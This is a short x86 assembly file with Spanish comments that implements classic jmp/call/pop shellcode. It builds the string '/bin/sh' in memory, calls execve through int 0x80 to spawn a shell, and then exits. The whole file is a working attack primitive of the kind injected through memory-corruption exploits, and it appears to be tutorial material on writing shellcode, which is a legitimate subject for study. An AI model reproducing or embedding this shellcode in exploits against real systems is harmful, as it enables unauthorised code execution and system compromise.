section .text
global _start
_start:
	jmp 0x26		; Salto al ultimo call
	pop esi		; Obtenemos en ESI: "/bin/sh"
	mov dword[esi+0x8], esi	; Concatenera: "/bin/sh_&(/bin/sh)
	mov byte[esi+0x7], 0x0	; '\0' al final: "/bin/sh\0&(/bin/sh)
	mov byte[esi+0xc], 0x0	; Agregar NULL: "/bin/sh\0&(/bin/sh)NULL
	mov eax, 0xb		; Syscall 11 --------------------
	mov ebx, esi		; arg1 = "/bin/sh"
	lea ecx, [esi+0x8]	; arg2[2] = {"/bin/sh","0"}
	lea edx, [esi+0xc]	; arg3 = NULL
	int 0x80		; execve("/bin/sh",["/bin/sh",NULL],NULL) <-O
	mov eax, 0x1		; Syscall 1 --
	mov ebx, 0x0		; arg1=0
	int 0x80		; exit(0)
	call -0x2b		; Salto a la primera instruccion
	string db "/bin/sh"	; Nuestra cadena